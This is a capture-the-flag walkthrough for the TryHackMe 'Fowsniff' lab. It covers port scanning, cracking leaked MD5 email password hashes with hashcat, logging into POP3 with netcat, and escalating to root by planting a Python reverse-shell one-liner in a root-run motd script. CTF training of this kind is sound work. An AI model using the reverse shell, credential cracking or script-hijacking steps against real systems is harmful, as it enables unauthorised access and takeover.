# [Fowsniff CTF](https://tryhackme.com/room/ctf)
> Darshan Patel

## Overview

| Tables | Description |
| ------ | ----------- |
| Challenge Name | Fowsniff CTF |
| Difficulty | Easy |
| Tags | port scanning, hashes, bruteforcing, pop3|

---
```bash
export IP=10.10.38.237
```

---

```bash
nmap -vvv -p -sC -sV -A -v -oN nmap/initial.nmap $IP
```

Nmap Scan: 
```
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp    open     http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp   open     pop3        Dovecot pop3d
|_pop3-capabilities: TOP USER CAPA RESP-CODES AUTH-RESP-CODE SASL(PLAIN) UIDL PIPELINING
143/tcp   open     imap        Dovecot imapd
1067/tcp  filtered instl_boots
2007/tcp  filtered dectalk
5988/tcp  filtered wbem-http
9535/tcp  filtered man
32781/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=9/18%OT=22%CT=1%CU=37471%PV=Y%DS=2%DC=T%G=Y%TM=5F64B36
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=EE%GCD=2%ISR=107%TI=Z%CI=RD%TS=A)SEQ(SP=E
OS:D%GCD=1%ISR=107%TI=Z%TS=8)SEQ(TI=Z%TS=B)OPS(O1=M508ST11NW6%O2=M508ST11NW
OS:6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%
OS:W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508N
OS:NSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T5(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN
OS:=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   151.34 ms 10.9.0.1
2   151.34 ms 10.10.68.237

```

We found a lot of ports opened now lets try to enumerate all of them one by one.
As you can see ssh is open so if we tend to exploit any username or password we can try to login through it.

Using Google, can you find any public information about them?

As you can see that they have something publicly available so I found this line on their website.

There was breach happened earlier on their systems and now all the users have changed their passwords.But I think there might be someone
who forgot to do this.
The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.

See they have twitter account so I searched for their account and found something amazing.

```
FowSniffCorp Pwned!
@FowsniffCorp
·
Mar 10, 2018
lol gr8 security @FowsniffCorp
 - too bad I'm dumping all your passwords!
FowsniffCorp - Pastebin.com
Pastebin.com is the number one paste tool since 2002. Pastebin is a website where you can store text online for a set period of time.
pastebin.com
```

So I was able to get the hashes.

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
 
l8r n00bz!
 
B1gN1nj4

mauer : ######
mustikka:#######
tegel:######
baksteen:######
seina:######
stone:Not found
mursten:#######
parede:######
sciana:######
```
So got the password for all the hashes except stone(You can crack the hashes at Crackstaion).

```
$ hashcat -m 0 hashes.txt ~/wordlists/passwords/rockyou.txt | tee cracked_passwords.txt
```

Using this I can log into the pop3 server via netcat

```
$ netcat $IP 110
```

And I use to gain access into the system:

![pop3_login](https://user-images.githubusercontent.com/87711310/207848072-b804a292-94c7-48df-b38e-b709fe594eb0.png)

Examining the emails, we learn that the initial threat actor gained access by SQL Injection and while that server has been moved offline, they have given their ssh credentials in plaintext and that they must change it.

![email_1](https://user-images.githubusercontent.com/87711310/207848049-cabb9bd6-e23b-4867-9129-6e2ca0262b70.png)

Seina seems to have changed hers however in the second email, she writes to a sick colleague of hers who has been sick and presumably not logged in recently...

![email_2](https://user-images.githubusercontent.com/87711310/207848060-d7eafbb3-3b04-4dca-b073-5505c335b367.png)

And now we have box access! I'm sure management is going to be chewed out again...

The task indicates we should search for a group owned file which is also executable.
It is important to note that this file is executed **_by root_** evidenced by `/etc/update-motd.d/`
```
$ find / -group users -type f -executable 2>/dev/null
> /opt/cube/cube.sh
```

We can put our reverse shell code into here (the task supplied one seems to be incorrectly copied?)
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<<IP>>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
I have attached the full file, which is correctly working!

Relogging into the machine... and we now have root access!

![flag](https://user-images.githubusercontent.com/87711310/207848064-cefe7cfe-ba4d-454b-9af6-33d88122a72f.png)
